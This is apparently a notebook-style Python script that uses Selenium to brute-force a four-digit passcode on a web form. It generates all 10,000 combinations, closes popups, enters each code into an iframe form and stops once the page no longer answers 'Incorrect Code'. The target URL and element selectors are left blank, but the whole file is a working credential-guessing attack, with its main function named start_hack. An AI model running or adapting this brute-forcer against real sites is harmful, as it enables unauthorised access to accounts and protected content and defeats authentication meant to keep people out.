from itertools import combinations,product
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait as wait
from selenium.webdriver.support import expected_conditions as ec
import time
import hashlib

#For the purposes of this notebook the actual links aren't in place but the frameworks are.
#We assume that the website has a button that needs to be clicked on initially to reach the form.
#We are assuming That the website may have an advertisement with an 'X' button that needs to be clicked on to close it.
#There is a form inside a particular iframe that we need to access to test the password.
def passcodes():
    # Generating the passcode to iterate through to obtain the optimal passcode from the website
    #We are assuming the passcode is any 4 digit number
    perms = []
    for combination in product(range(10),repeat = 4):
        perms.append(''.join(map(str,combination)))
    print(f"Length of perms is {len(perms)}")
    return perms

def start_hack(key,driver):
    while (True):  #Once driver variable goes out of scope then the browser shuts down
        try:
            action1  = driver.find_element_by_xpath("")
            action1.click()
        except:
            pass
        try :
            action2 = driver.find_element_by_xpath("")
            action2.click()
        except:
            pass
        driver.switch_to.default_content()
        iframe = driver.find_elements_by_tag_name('iframe')[3] #Enter frame index number here inside the []
        driver.switch_to.frame(iframe)
        res = hashlib.sha256(key.encode())
        print(f"{res} is the key being tested")
        driver.implicitly_wait(15)
        action3 = driver.find_element_by_css_selector(".form-control")
        action3.send_keys(key)
        action4 = driver.find_element_by_id("submit")
        action4.click()
        break
    INCORRECT = driver.find_element_by_xpath("")
    state = INCORRECT.text
    driver.switch_to.default_content()
    return state

if __name__ == "__main__":
    req = passcodes()
    # print(req)
    driver = webdriver.Firefox()
    driver.get("")
    for key in req:
        key = str(key)
        FLAG = start_hack(key,driver)
        if FLAG == "Incorrect Code":
            driver.refresh() 
        else:
            break
    print(f"{key} is the password")

    driver.close()
    